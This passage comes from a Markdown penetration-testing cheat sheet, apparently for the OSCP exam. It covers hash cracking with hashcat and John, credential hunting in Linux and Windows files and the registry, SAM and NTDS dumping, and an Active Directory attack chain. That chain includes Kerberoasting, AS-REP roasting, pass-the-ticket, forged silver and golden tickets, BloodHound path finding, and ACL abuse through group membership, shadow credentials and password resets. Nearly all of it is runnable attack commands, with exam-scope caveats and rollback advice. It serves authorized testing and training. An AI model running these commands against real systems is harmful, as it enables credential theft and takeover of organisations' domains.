hashcat -m 1000 -a 1 hash.txt words1.txt words2.txt  # Combinator
hashcat -m 1000 -a 3 hash.txt ?a?a?a?a?a?a           # Brute force mask
hashcat -m 1000 -a 6 hash.txt rockyou.txt ?d?d?d      # Hybrid word+mask
# Mask chars: ?l=lowercase ?u=uppercase ?d=digit ?s=special ?a=all

# Continue session:
hashcat -m 1000 hash.txt rockyou.txt --restore

# Show cracked:
hashcat -m 1000 hash.txt --show

# ── JOHN THE RIPPER ───────────────────────────────────────────
john hash.txt --wordlist=rockyou.txt
john hash.txt --wordlist=rockyou.txt --rules=All
john hash.txt --format=NT --wordlist=rockyou.txt
john hash.txt --show
john hash.txt --show --format=NT
john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=md5crypt
# Format conversions (john's *2john tools):
ssh2john id_rsa > id_rsa.hash
zip2john protected.zip > zip.hash
rar2john protected.rar > rar.hash
pdf2john protected.pdf > pdf.hash
keepass2john Database.kdbx > kp.hash
7z2john archive.7z > 7z.hash
office2john document.docx > office.hash
gpg2john private.gpg > gpg.hash
bitlocker2john disk.img > bitlocker.hash
luks2john encrypted.img > luks.hash

# ── UNSHADOW (combine passwd + shadow) ────────────────────────
unshadow /etc/passwd /etc/shadow > combined.txt
john combined.txt --wordlist=rockyou.txt

# ── WINDOWS HASHES ────────────────────────────────────────────
# SAM + SYSTEM dump → extract:
impacket-secretsdump -sam SAM -system SYSTEM LOCAL
# Output: user:RID:LM:NTLM:::
# NTLM hash is the last field

# From live system (with admin):
impacket-secretsdump domain/admin:pass@$IP
impacket-secretsdump -just-dc-ntlm domain/admin:pass@$IP   # NTDS only

# Responder poisoning/spoofing commands are intentionally omitted.
# If passive visibility is useful, use analyze mode only: sudo responder -I tun0 -A
```


</details>


<details>


<summary>🔑 8.3 Credential Hunting</summary>






``` bash
# ── LINUX CREDENTIAL LOCATIONS ────────────────────────────────
cat /etc/passwd                    # User list
cat /etc/shadow                    # Hashed passwords (need root)
cat /etc/group                     # Groups
cat ~/.bash_history                # Command history (goldmine!)
cat ~/.zsh_history
cat ~/.mysql_history
cat ~/.psql_history
cat ~/.python_history
cat ~/.wget-hsts                   # Sites visited
cat ~/.ssh/id_rsa                  # Private SSH key
cat ~/.ssh/authorized_keys         # Public keys
cat ~/.ssh/known_hosts             # Hosts connected to
cat ~/.netrc                       # FTP/HTTP creds
cat /var/www/html/config.php       # Web app creds
cat /var/www/html/wp-config.php    # WordPress DB creds
cat /var/www/html/.env             # Laravel, Django, etc.
cat /opt/*/config*
find / -name "*.conf" -readable 2>/dev/null | xargs grep -l "password\|passwd\|secret" 2>/dev/null
find / -name "*.php" -readable 2>/dev/null | xargs grep -l "password\|db_pass" 2>/dev/null
find / -name "*.py" -readable 2>/dev/null | xargs grep -l "password\|secret" 2>/dev/null
find / -name "*.xml" -readable 2>/dev/null | xargs grep -l "password\|secret" 2>/dev/null
find / -name "id_rsa" 2>/dev/null
find / -name "*.pem" -o -name "*.key" 2>/dev/null

# ── WINDOWS CREDENTIAL LOCATIONS ──────────────────────────────
# Registry:
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"  # AutoLogon creds!
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"                    # PuTTY creds
reg query "HKCU\Software\ORL\WinVNC3\Password"                          # VNC password
reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"                 # SNMP community

# Files:
type C:\Windows\Panther\Unattend.xml       # Unattended install
type C:\Windows\Panther\Unattended.xml
type C:\Windows\system32\sysprep\sysprep.xml
type C:\Windows\system32\sysprep.inf
type C:\inetpub\wwwroot\web.config          # IIS config
type C:\xampp\htdocs\*\config.php
dir /s /b "password.txt" 2>nul
dir /s /b "*pass*" 2>nul
dir /s /b "*cred*" 2>nul
dir /s /b "*vnc*" 2>nul
findstr /si "password" *.txt *.xml *.ini *.conf 2>nul
findstr /si "password" C:\*.txt C:\*.xml C:\*.ini 2>nul

# Credential Manager:
cmdkey /list
# If RDP creds saved:
runas /savedcredentials /user:DOMAIN\admin cmd.exe

# WiFi passwords:
netsh wlan show profiles
netsh wlan show profile name="SSID" key=clear

# SAM (requires SYSTEM):
reg save HKLM\SAM C:\temp\SAM
reg save HKLM\SYSTEM C:\temp\SYSTEM
reg save HKLM\SECURITY C:\temp\SECURITY

# ── GPP PASSWORDS (SYSVOL — CRITICAL) ─────────────────────────
# Files: Groups.xml, Services.xml, Scheduledtasks.xml
# Location: \\DC\SYSVOL\domain\Policies\**\
find / -name "Groups.xml" 2>/dev/null
# Decrypt cpassword:
gpp-decrypt "CPASSWORD"
# PowerShell:
Get-GPPPassword
```


</details>


------------------------------------------------------------------------

<details>
<summary>🧾 8.x TARGET PROGRESS LEDGER — Prevent Rabbit Holes</summary>

Copy this once for every target and update it continuously:

```text
TARGET:
TYPE: AD / standalone
POINTS CURRENTLY BANKED:
LAST REAL PROGRESS TIME:

OPEN PORTS:
HOSTNAMES / VHOSTS:
USERS:
CREDS / HASHES / KEYS:
SHARES:
INTERESTING FILES:
INTERNAL-ONLY PORTS:
PRIVILEGES / GROUPS:
BLOODHOUND / ACL EDGES:
EXACT VERSIONS / CVEs:

CURRENT HYPOTHESIS:
EVIDENCE FOR IT:
WHAT FAILED:
WHY IT FAILED:

NEXT 3 ACTIONS:
1.
2.
3.

OFFICIAL FLAG SCREENSHOT VALID?  [ ]
FLAG SUBMITTED IN CONTROL PANEL? [ ]
REPORT STEPS REPRODUCIBLE?       [ ]
```

### Rabbit-hole rule

A failed exploit attempt is useful only if it **changes your model** of the target.

After 20–30 minutes, ask:

```text
What did I learn that I did not know 30 minutes ago?
```

If the answer is "nothing", rotate to another target or another service.

</details>


## 9. ACTIVE DIRECTORY --- FULL ATTACK CHAIN

> ⚠️ **Exam note:** since Nov 2024 the AD set is "assumed compromise"
> --- you're handed a low-priv domain username + password on Day 1, goal
> is full DC compromise. So the AD SET itself starts at **PHASE 2**
> below. PHASE 1 (unauthenticated) is still a real skill --- it shows up
> on standalone machines that touch AD-adjacent services, and in real
> engagements --- just don't expect it to be how you get INTO the AD
> set.


<details>

<summary>🚦 9.0A Issued Domain Credential — First 10 Minutes + Failure Rescue</summary>

`[DECISION:AD]` `[REQ:DOMAIN_CREDS]` `[AD:AUTH-RESCUE]`

> **Goal:** turn the issued account into verified domain visibility and one
> evidence-backed path. This is a sequence, not a spray. Run it only against
> known, in-scope services and stop when a stronger signal appears.

### 1. Establish ground truth before blaming the credential

```bash
export DOMAIN='domain.local'
export DC='dc01.domain.local'
export DC_IP='10.10.10.10'
export AUTH_USER='issued.user'
export AUTH_PASS='issued-password'

getent hosts "$DC"
dig @"$DC_IP" _ldap._tcp.dc._msdcs."$DOMAIN" SRV +short
sudo ntpdate -q "$DC_IP" 2>/dev/null || date -u
nmap -Pn -n -p 53,88,135,139,389,445,464,593,636,3268,3269,3389,5985,5986 "$DC_IP" -oA ad-baseline
```

If Kerberos reports skew, verify the correct DC and UTC offset, then sync Kali
and retry the *same* command. A transport, DNS or time failure says nothing
about password validity.

### 2. Prove authentication, then enumerate rights

```bash
nxc smb "$DC_IP" -u "$AUTH_USER" -p "$AUTH_PASS" -d "$DOMAIN"
nxc ldap "$DC_IP" -u "$AUTH_USER" -p "$AUTH_PASS" -d "$DOMAIN"
smbclient -L "//$DC_IP/" -U "$DOMAIN/$AUTH_USER"

nxc smb "$DC_IP" -u "$AUTH_USER" -p "$AUTH_PASS" -d "$DOMAIN" --shares
nxc ldap "$DC_IP" -u "$AUTH_USER" -p "$AUTH_PASS" -d "$DOMAIN" --users
nxc ldap "$DC_IP" -u "$AUTH_USER" -p "$AUTH_PASS" -d "$DOMAIN" --groups
```

**Identity format:** use `-d DOMAIN`, `DOMAIN/user`, or `user@domain.local` for
a domain identity. For a proven local account, omit the domain and use
NetExec's `--local-auth`. Never treat successful authentication as proof of
share access, WinRM logon rights or administrative execution.

### 3. Request high-signal domain data

```bash
impacket-GetUserSPNs "$DOMAIN/$AUTH_USER:$AUTH_PASS" -dc-ip "$DC_IP" -request -outputfile kerberoast.txt
# After saving confirmed usernames:
impacket-GetNPUsers "$DOMAIN/" -dc-ip "$DC_IP" -request -no-pass -usersfile users.txt -outputfile asrep.txt

bloodhound-ce-python -u "$AUTH_USER" -p "$AUTH_PASS" -d "$DOMAIN" -dc "$DC" -ns "$DC_IP" -c All --zip
certipy find -u "$AUTH_USER@$DOMAIN" -p "$AUTH_PASS" -dc-ip "$DC_IP" -enabled -vulnerable -stdout
```

Inspect the current principal's outgoing control, group membership,
sessions/admin rights, delegation, LAPS/gMSA visibility and certificate paths.
Re-collect after every new identity or material directory change.

### 4. Decode the failure before switching tools

| Signal | What it establishes | Next decisive check |
|---|---|---|
| `KDC_ERR_PREAUTH_REQUIRED` | Expected request flow; often confirms that the principal exists | Continue authenticated request; this alone is not AS-REP roastability |
| `KRB_AP_ERR_SKEW` | Time failure, not password failure | Confirm DC/time, sync, retry unchanged |
| `KDC_ERR_S_PRINCIPAL_UNKNOWN` | Hostname/SPN/service identity problem | Use FQDN; verify DNS and actual target |
| `KRB_AP_ERR_MODIFIED` | Service cannot decrypt the ticket | Check FQDN/SPN/DNS, stale tickets and duplicate identity |
| `STATUS_LOGON_FAILURE` / `KDC_ERR_PREAUTH_FAILED` | Presented identity/secret was rejected | Check Unicode, local/domain form and provenance once; stop repeated retries |
| `STATUS_ACCESS_DENIED` / WinRM authorization error | Resource/logon/action not authorized; credential may still be valid | Validate via SMB/LDAP/native client and inspect exact rights |
| `STATUS_BAD_NETWORK_NAME` | Requested share is wrong | List shares, then use an exact returned name |
| NetExec `[+]` without `Pwn3d!` | Authentication accepted; admin execution not established | Enumerate permitted data/rights |
| `Pwn3d!` | Protocol-specific administrative/code-execution capability indicated | Use the matching client; verify the new token with `whoami /all` |
| Unknown option/import/usage error | Local tool/version problem | Read installed help/version; do not discard the attack hypothesis |

### 5. Edge execution gate

1. Name the exact controlled source principal, target object and edge/right.
2. Name the required host, protocol, session and token context.
3. Prove the prerequisite with a read/query before a write.
4. For any mutation: record current state, backup, minimal change, validation
   and rollback.
5. Verify the resulting identity/access, re-enumerate, and re-collect the graph.

**New-session rule:** a new shell, remote protocol or logon method can produce
a different token, groups, profile, network reachability and credential
visibility. Baseline again instead of assuming equivalence.

</details>


<details>


<summary>🗺️ 9.1 AD Attack Flow Overview</summary>

### 2026 Exam Fast Path — Issued Domain Credentials

```text
ISSUED USER/PASSWORD
        ↓
identify domain + DC + DNS
        ↓
NXC: SMB / LDAP / WinRM / RDP rights
        ↓
shares + SYSVOL + scripts + user descriptions
        ↓
Kerberoast / AS-REP opportunities
        ↓
BloodHound collection
        ↓
OUTGOING CONTROL / ACL / GROUP / DELEGATION / LAPS / gMSA / AD CS
        ↓
get first shell
        ↓
LOCAL WINDOWS PRIVESC + CREDENTIAL SEARCH
        ↓
set up pivot if needed
        ↓
REPEAT ENUMERATION WITH EVERY NEW IDENTITY
```

Quick commands:

```bash
nxc smb $DC -u "$USER" -p "$PASS" -d "$DOMAIN"
nxc smb $DC -u "$USER" -p "$PASS" -d "$DOMAIN" --shares
nxc ldap $DC -u "$USER" -p "$PASS" -d "$DOMAIN" --users
nxc ldap $DC -u "$USER" -p "$PASS" -d "$DOMAIN" --groups
nxc winrm <TARGETS> -u "$USER" -p "$PASS" -d "$DOMAIN"
```

**BloodHound rule:** do not look only for "shortest path to Domain Admin". Inspect the current user's **outgoing object control**, group membership, writable objects, delegation relationships, session/admin relationships and certificate-related paths. Re-run/re-interpret the graph whenever you obtain a new identity.

**Pivot rule:** OffSec confirms that pivoting may be required in the AD set. Re-enumerate routes and reachable services after each foothold.








    PHASE 1: UNAUTHENTICATED (only when the surface exists)
      ├── Enumerate: nmap, nxc, rpcclient, ldapsearch, enum4linux-ng
      ├── EXAM: do not use LLMNR/NBT-NS poisoning or spoofing
      ├── AS-REP request only for confirmed usernames
      └── No blind spray: inspect policy and use only evidence-derived candidates

    PHASE 2: AUTHENTICATED (issued / discovered low-priv user)
      ├── Prove DNS, time, SMB and LDAP before changing tools
      ├── Shares, SYSVOL, scripts, descriptions, users, groups, computers
      ├── Kerberoast / AS-REP material → save → identify → crack if justified
      ├── BloodHound: current principal's outgoing control and shortest owned paths
      ├── ACL, delegation, LAPS, gMSA and AD CS prerequisites
      └── Translate one exact edge through the V19 prove/act/verify/restore desk

    PHASE 3: LATERAL MOVEMENT
      ├── Test each new credential only on appropriate exposed in-scope services
      ├── Match password/hash/ticket/certificate to a supported protocol
      ├── Record the protocol/session because token context changes
      └── Re-enumerate and re-collect after every new identity or route

    PHASE 4: DOMAIN OBJECTIVE
      ├── Validate the exact final edge and required service
      ├── Prefer targeted collection (for example one DCSync user first)
      ├── Capture proof/report evidence immediately when earned
      └── Restore temporary mutations; do not add persistence for the report


</details>


<details>


<summary>🔍 9.2 Unauthenticated Enumeration</summary>






``` bash
# ── INITIAL RECON ─────────────────────────────────────────────
# nxc fingerprint (even without creds):
nxc smb $IP              # Shows: OS, hostname, domain, signing
nxc smb $IP --shares -u '' -p ''   # Null session shares
nxc smb $IP --shares -u 'guest' -p ''

# Enum4linux (null session):
enum4linux -a $IP 2>/dev/null | tee loot/ad/enum4linux.txt

# ── KERBRUTE USER ENUM ────────────────────────────────────────
kerbrute userenum -d $DOMAIN /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt --dc $IP
kerbrute userenum -d $DOMAIN /usr/share/seclists/Usernames/Names/names.txt --dc $IP
# Save valid users:
kerbrute userenum -d $DOMAIN users.txt --dc $IP -o valid_users.txt

# ── RPC USER ENUM (null session) ──────────────────────────────
rpcclient -U "" -N $IP -c "enumdomusers"
rpcclient -U "" -N $IP -c "querydominfo"
# RID cycling:
for i in $(seq 1 1000); do
  rpcclient -U "" -N $IP -c "queryuser $(printf '0x%x' $i)" 2>/dev/null | grep "User Name"
done
nxc smb $IP -u '' -p '' --rid-brute | tee loot/ad/rid_cycle.txt

# ── LDAP ANONYMOUS ────────────────────────────────────────────
ldapsearch -x -H ldap://$IP -b "dc=$(echo $DOMAIN | tr '.' ','|sed 's/,/,dc=/g')" 2>/dev/null | tee loot/ad/ldap_anon.txt
# More structured:
ldapdomaindump $IP -o loot/ad/ldapdump 2>/dev/null   # No auth attempt
```


</details>


<details>

<summary>🛡️ 9.3 Responder — Analyze Mode Only</summary>

> **RULE-SENSITIVE:** Responder may be used only for an action permitted by the current exam guide. Poisoning and spoofing are prohibited.

```bash
# Passive analysis only: inspect requests without answering them.
sudo responder -I tun0 -A

# Prefer packet-level validation when you only need visibility.
sudo tcpdump -ni tun0 'udp port 5355 or udp port 137 or udp port 53'
```

Do not enable LLMNR/NBT-NS poisoning, WPAD responses, forced authentication, or relay workflows. If the required action is unclear, stop and re-check the official guide.

</details>


<details>


<summary>🎫 9.4 Kerberos Attacks</summary>






``` bash
# ── AS-REP ROASTING ───────────────────────────────────────────
# Users with "Do not require Kerberos preauthentication" = vuln
# No creds needed!
impacket-GetNPUsers "$DOMAIN/" -dc-ip "$DC_IP" -request -no-pass -usersfile valid_users.txt -outputfile asrep_hashes.txt
# Do not infer roastability from KDC_ERR_PREAUTH_REQUIRED; a hash must actually be returned.
# From Windows:
Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt
# Crack (hashcat -m 18200):
hashcat -m 18200 asrep_hashes.txt rockyou.txt

# ── KERBEROASTING ─────────────────────────────────────────────
# With valid credentials:
impacket-GetUserSPNs "$DOMAIN/$AUTH_USER:$AUTH_PASS" -dc-ip "$DC_IP" -request -outputfile kerb_hashes.txt
impacket-GetUserSPNs "$DOMAIN/$AUTH_USER" -dc-ip "$DC_IP" -request -no-pass -k -outputfile kerb_hashes.txt  # With ccache
# From Windows:
Rubeus.exe kerberoast /format:hashcat /outfile:kerb_hashes.txt
Rubeus.exe kerberoast /user:targetuser /format:hashcat
# Invoke-Kerberoast (PowerView):
Invoke-Kerberoast -OutputFormat Hashcat | fl
# Crack (hashcat -m 13100):
hashcat -m 13100 kerb_hashes.txt rockyou.txt
hashcat -m 13100 kerb_hashes.txt rockyou.txt -r best64.rule

# ── TARGETED KERBEROAST (if GenericWrite) ─────────────────────
# Record the current SPN list; let the tool add/remove one temporary SPN.
bloodyAD -H "$DC" -i "$DC_IP" -d "$DOMAIN" -u "$AUTH_USER" -p "$AUTH_PASS" get object "$EDGE_TARGET" --attr servicePrincipalName
targetedKerberoast.py -d "$DOMAIN" -u "$AUTH_USER" -p "$AUTH_PASS" --dc-ip "$DC_IP" --request-user "$EDGE_TARGET" --only-abuse -o targeted-kerberoast.txt
# Re-read and compare; never clear pre-existing SPNs.
bloodyAD -H "$DC" -i "$DC_IP" -d "$DOMAIN" -u "$AUTH_USER" -p "$AUTH_PASS" get object "$EDGE_TARGET" --attr servicePrincipalName

# ── PASS THE TICKET ───────────────────────────────────────────
# Get TGT:
impacket-getTGT "$DOMAIN/$AUTH_USER:$AUTH_PASS" -dc-ip "$DC_IP"           # → user.ccache
impacket-getTGT "$DOMAIN/$AUTH_USER" -hashes ":$NT_HASH" -dc-ip "$DC_IP"
export KRB5CCNAME=/path/to/user.ccache
# Use with impacket:
impacket-psexec $DOMAIN/user@target -no-pass -k
impacket-smbclient $DOMAIN/user@target -no-pass -k
impacket-wmiexec $DOMAIN/user@target -no-pass -k
# From Windows — Rubeus:
Rubeus.exe asktgt /user:user /password:pass /domain:$DOMAIN /dc:$IP /ptt
Rubeus.exe ptt /ticket:base64ticket
klist    # Verify

# ── OVERPASS THE HASH ─────────────────────────────────────────
# Convert NTLM hash to Kerberos ticket:
# Mimikatz:
sekurlsa::pth /user:user /domain:$DOMAIN /ntlm:NTLMHASH /run:cmd.exe
# New cmd window → now has Kerberos ticket
# From Kali:
impacket-getTGT "$DOMAIN/$AUTH_USER" -hashes ":$NT_HASH" -dc-ip "$DC_IP"
export KRB5CCNAME=user.ccache
impacket-psexec $DOMAIN/user@DC -no-pass -k

# ── SILVER TICKET ─────────────────────────────────────────────
# Forge service ticket (requires service account hash + SID)
# More stealthy than golden (no DC communication)
impacket-ticketer -nthash SERVICEHASH -domain-sid S-1-5-21-xxx -domain $DOMAIN -spn cifs/server.domain.com administrator
export KRB5CCNAME=administrator.ccache
impacket-psexec $DOMAIN/administrator@server.domain.com -no-pass -k

# ── GOLDEN TICKET ─────────────────────────────────────────────
# Requires: KRBTGT hash + Domain SID
# Get domain SID:
impacket-lookupsid $DOMAIN/user:pass@$IP | grep "Domain SID"
# Get KRBTGT hash (DCSync required — need DA or replication rights):
impacket-secretsdump $DOMAIN/admin:pass@$IP -just-dc-user krbtgt
# Forge:
impacket-ticketer -nthash KRBTGT_NTLM -domain-sid S-1-5-21-xxx -domain $DOMAIN administrator
export KRB5CCNAME=administrator.ccache
impacket-psexec $DOMAIN/administrator@$DC -no-pass -k
# Mimikatz golden ticket:
kerberos::golden /domain:$DOMAIN /sid:S-1-5-21-xxx /krbtgt:HASH /user:Administrator /ptt

# ── DIAMOND/SAPPHIRE TICKET (newer, harder to detect) ─────────
Rubeus.exe diamond /tgtdeleg /ticketuser:user /ticketuserid:500 /groups:512
```


</details>


<details>


<summary>🔎 9.5 BloodHound --- Complete Workflow</summary>






``` bash
# ── DATA COLLECTION ───────────────────────────────────────────
# From Kali (BloodHound CE collector; requires creds):
bloodhound-ce-python -u "$AUTH_USER" -p "$AUTH_PASS" -d "$DOMAIN" -dc "$DC" -ns "$DC_IP" -c All --zip
# Output: *.json or *.zip

# From Windows (SharpHound):
SharpHound.exe -c All --outputdirectory C:\Users\Public\ --zipfilename loot.zip
SharpHound.exe -c All,GPOLocalGroup  # Include GPO local group membership
Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\Public\

# ── IMPORT INTO YOUR PREPARED LOCAL BLOODHOUND CE INSTANCE ───
# Use the CE web UI's Administration → File Ingest page.
# Collector/server generations must match; inspect installed help/version.
# The legacy `sudo neo4j start; bloodhound &` sequence is not the CE workflow.

# ── KEY QUERIES ───────────────────────────────────────────────
# Pre-built:
"Find all Domain Admins"
"Find Shortest Paths to Domain Admins"
"Find Principals with DCSync Rights"
"Find Computers with Unsupported Operating Systems"
"Shortest Path from Owned Principals"
"Find AS-REP Roastable Users"
"Find Kerberoastable Users with Most Privileges"
"List all Kerberoastable Accounts"
"Find Users with Foreign Domain Group Membership"
"Find Dangerous Rights for Domain Users"

# Custom Cypher queries (in Raw Query box):
# Users with local admin:
MATCH (m:Computer) WHERE m.operatingsystem =~ '(?i).*(7|2008|xp|vista).*' RETURN m

# Path from user to DA:
MATCH (u:User {name:"USER@DOMAIN"}), (g:Group {name:"DOMAIN ADMINS@DOMAIN"}), p=shortestPath((u)-[*1..]->(g)) RETURN p

# All machines current user can reach:
MATCH (c:Computer), (u:User {name:"USER@DOMAIN"}), p=shortestPath((u)-[*1..]->(c)) RETURN p

# ── MARK AS OWNED ─────────────────────────────────────────────
# Right-click user/computer → Mark as Owned
# Then: "Shortest Path from Owned" → finds exact attack path

# ── BLOODHOUND ATTACK PATHS ───────────────────────────────────
# Never translate an edge directly into a copied write command.
# Open 9.6B and record:
#   source → exact edge/object → prerequisites → read/pre-state
#   → minimum action → verification → rollback → re-collection
# GenericAll/GenericWrite is target-type dependent:
#   user     → shadow credentials or WriteSPN before password reset
#   group    → one exact membership, fresh token, exact removal
#   computer → LAPS/shadow/RBCD only when their prerequisites hold
# WriteOwner is only a bridge to DACL control; record the old owner.
# WriteDacl requires a full backup and the minimum exact right.
```


</details>


<details>


<summary>🧭 9.6 AD Attack-Path Methodology --- Build the Graph, Don't Just Run Tools</summary>







``` text
LOW-PRIV DOMAIN USER
        ↓
IDENTIFY DOMAIN / DC / DNS
        ↓
USERS + GROUPS + COMPUTERS
        ↓
SMB + LDAP + KERBEROS
        ↓
SPNs / AS-REP / PASSWORD REUSE
        ↓
ACLs / DELEGATION / GPOs
        ↓
LAPS / gMSA
        ↓
SHADOW CREDENTIALS
        ↓
AD CS / ESC1–ESC17
        ↓
RELAY / COERCION WHERE APPLICABLE
        ↓
LATERAL MOVEMENT
        ↓
DC / DCSYNC / DOMAIN COMPROMISE
```

### First-pass commands

``` bash
nxc smb <DC> -u 'USER' -p 'PASS' -d DOMAIN
nxc ldap <DC> -u 'USER' -p 'PASS' -d DOMAIN
nxc ldap <DC> -u 'USER' -p 'PASS' -d DOMAIN --users
nxc ldap <DC> -u 'USER' -p 'PASS' -d DOMAIN --groups
nxc ldap <DC> -u 'USER' -p 'PASS' -d DOMAIN --computers
```

### Credentials → service matrix

Whenever you find credentials, test them against appropriate in-scope
services:

``` text
SMB
LDAP
WinRM
RDP
MSSQL
SSH
FTP
HTTP applications
VPN
Shares
Service accounts
```

Also identify whether the material is:

``` text
Password
NT hash
Kerberos ticket
Certificate/private key
LAPS password
gMSA credential
DPAPI secret
```


</details>


<details>

<summary>🧭 9.6B V19 BloodHound Edge Execution Desk — Prove, Act, Verify, Restore</summary>

`[DECISION:AD]` `[AD:ACL]` `[AD:EDGE]` `[V19:ROLLBACK]`

> A BloodHound edge is a capability claim, not proof that your current
> credential, ticket, token, route, protocol, session, target policy or tool
> syntax can execute it. Start with the exact source and destination shown by
> the edge. Never replace the target with a more privileged object merely
> because a copied command uses one in its example.

### Shared variables

```bash
export DOMAIN='domain.local'
export DC='dc01.domain.local'
export DC_IP='10.10.10.10'
export AUTH_USER='issued.user'
export AUTH_PASS='issued-password'

export EDGE_TARGET='target.sam'          # exact user/group/computer/domain object
export CONTROLLED_PRINCIPAL='owned.sam'  # exact source you control
export CONTROLLED_COMPUTER='ownedpc$'    # trailing $ for computer account
export COMPUTER_PASS='computer-password'
export TARGET_HOST='server01.domain.local'
```

### The mandatory five-line record

```text
SOURCE I CONTROL:
EDGE + EXACT TARGET OBJECT / TYPE:
PREREQUISITES PROVED + READ-ONLY OUTPUT SAVED:
MINIMUM ACTION + EXPECTED RESULT:
ROLLBACK / CLOSE COMMAND + POST-STATE VERIFICATION:
```

### Edge selection matrix

| Edge / target | Prove first | Preferred minimum path | Rollback / close |
|---|---|---|---|
| GenericAll / GenericWrite → user | Exact writable attribute; PKINIT or WriteSPN prerequisites | Shadow Credentials `auto`; otherwise targeted Kerberoast | Compare key/SPN pre/post; never clear all values |
| AddMember / GenericAll → group | Exact group and current membership | Add only the controlled principal | Fresh token; remove that exact membership |
| ForceChangePassword → user | Exact edge; service-account impact; no safer path | One necessary reset | No generic safe rollback without old password |
| WriteDacl → object | Exact object/right and backup file | One minimum ACE | Restore the exact DACL backup |
| WriteOwner → object | Original owner recorded | Ownership only as bridge to minimum DACL change | Restore DACL, then exact old owner |
| AddKeyCredentialLink → user/computer | 2016+ schema/DC and PKINIT/CA | One-target Certipy `shadow auto` | Confirm auto cleanup; exact device ID only if needed |
| AllowedToAct / AddAllowedToAct → computer | Controlled account has SPN; 2012+ target; delegable user | One delegate + service/FQDN-matched ticket | Remove only that delegate; never `flush` |
| AdminTo → computer | Fresh edge, route, host identity and exposed remote service | One matching remote protocol | Exit; delete only your temporary payloads |
| CanPSRemote → computer | 5985/5986, credential and endpoint policy | WinRM session | Exit; re-baseline that session's token |
| CanRDP → computer | 3389, account type, NLA/policy | RDP session | Log off; re-baseline the desktop token |
| ReadLAPSPassword → computer | Exact computer object mapped to host | Read one LAPS password; use local auth | Read-only; unset/protect secret |
| ReadGMSAPassword → gMSA | Exact gMSA and useful SPN/path | LDAP read; validate one gMSA identity | Read-only; unset/protect hash |
| DCSync → domain | GetChanges + GetChangesAll composition | Dump one required user first | Read-only; protect output |

### User control: GenericAll / GenericWrite / AddKeyCredentialLink

```bash
# Read target and existing key/SPN state first.
bloodyAD -H "$DC" -i "$DC_IP" -d "$DOMAIN" -u "$AUTH_USER" -p "$AUTH_PASS" \
  get object "$EDGE_TARGET" --attr sAMAccountName,userAccountControl,servicePrincipalName,msDS-KeyCredentialLink

# Confirm DC functionality. Shadow Credentials need 2016+ schema/DC and PKINIT.
bloodyAD -H "$DC" -i "$DC_IP" -d "$DOMAIN" -u "$AUTH_USER" -p "$AUTH_PASS" \
  get object '' --attr domainControllerFunctionality

certipy shadow list -u "$AUTH_USER@$DOMAIN" -p "$AUTH_PASS" \
  -account "$EDGE_TARGET" -dc-ip "$DC_IP"

# Preferred reversible branch when prerequisites are proven.
certipy shadow auto -u "$AUTH_USER@$DOMAIN" -p "$AUTH_PASS" \
  -account "$EDGE_TARGET" -dc-ip "$DC_IP"

# Verify that auto removed its inserted key by comparing with the pre-state.
certipy shadow list -u "$AUTH_USER@$DOMAIN" -p "$AUTH_PASS" \
  -account "$EDGE_TARGET" -dc-ip "$DC_IP"

# If auto cleanup failed, remove ONLY the recorded device ID.
# Never use clear against a target with pre-existing key credentials.
certipy shadow remove -u "$AUTH_USER@$DOMAIN" -p "$AUTH_PASS" \
  -account "$EDGE_TARGET" -device-id "$DEVICE_ID" -dc-ip "$DC_IP"
```

If PKINIT fails, the ACL edge may still be real. Diagnose DC functionality,
CA/PKINIT, DNS, time and installed Certipy syntax before changing the target.

### WriteSPN / targeted Kerberoast

```bash
# Save the exact pre-existing SPNs.
bloodyAD -H "$DC" -i "$DC_IP" -d "$DOMAIN" -u "$AUTH_USER" -p "$AUTH_PASS" \
  get object "$EDGE_TARGET" --attr servicePrincipalName

# EDGE_TARGET is the target sAMAccountName only.
targetedKerberoast.py -d "$DOMAIN" -u "$AUTH_USER" -p "$AUTH_PASS" \
  --dc-ip "$DC_IP" --request-user "$EDGE_TARGET" --only-abuse \
  -o targeted-kerberoast.txt

test -s targeted-kerberoast.txt && hashcat --identify targeted-kerberoast.txt

# The tool should remove its temporary SPN. Prove that the post-state matches.
bloodyAD -H "$DC" -i "$DC_IP" -d "$DOMAIN" -u "$AUTH_USER" -p "$AUTH_PASS" \
  get object "$EDGE_TARGET" --attr servicePrincipalName
```

A TGS hash is not a password. Crack it offline only when the target's likely
password quality and the evidence-derived wordlist justify the time.

### AddMember / group control

```bash
# Save current members.
bloodyAD -H "$DC" -i "$DC_IP" -d "$DOMAIN" -u "$AUTH_USER" -p "$AUTH_PASS" \
  get object "$EDGE_TARGET" --attr member

# Add exactly one controlled principal.
bloodyAD -H "$DC" -i "$DC_IP" -d "$DOMAIN" -u "$AUTH_USER" -p "$AUTH_PASS" \
  add groupMember "$EDGE_TARGET" "$CONTROLLED_PRINCIPAL"

bloodyAD -H "$DC" -i "$DC_IP" -d "$DOMAIN" -u "$AUTH_USER" -p "$AUTH_PASS" \
  get membership "$CONTROLLED_PRINCIPAL"

# Obtain a fresh logon/ticket/session; an existing token will not gain the group.

# Remove only the membership you added and re-read the group.
bloodyAD -H "$DC" -i "$DC_IP" -d "$DOMAIN" -u "$AUTH_USER" -p "$AUTH_PASS" \
  remove groupMember "$EDGE_TARGET" "$CONTROLLED_PRINCIPAL"
```

### ForceChangePassword — last disruptive user branch

```bash
bloodyAD -H "$DC" -i "$DC_IP" -d "$DOMAIN" -u "$AUTH_USER" -p "$AUTH_PASS" \
  get object "$EDGE_TARGET" --attr sAMAccountName,userAccountControl,pwdLastSet,servicePrincipalName

export NEW_PASS='replace-with-compliant-one-time-password'
bloodyAD -H "$DC" -i "$DC_IP" -d "$DOMAIN" -u "$AUTH_USER" -p "$AUTH_PASS" \
  set password "$EDGE_TARGET" "$NEW_PASS"

nxc smb "$DC_IP" -u "$EDGE_TARGET" -p "$NEW_PASS" -d "$DOMAIN"
nxc ldap "$DC_IP" -u "$EDGE_TARGET" -p "$NEW_PASS" -d "$DOMAIN"
```

**NO SAFE GENERIC ROLLBACK exists when the original password is unknown.** A
reset can break a service, task or application. Do not perform a second reset
and call it cleanup.

### WriteDacl

```bash
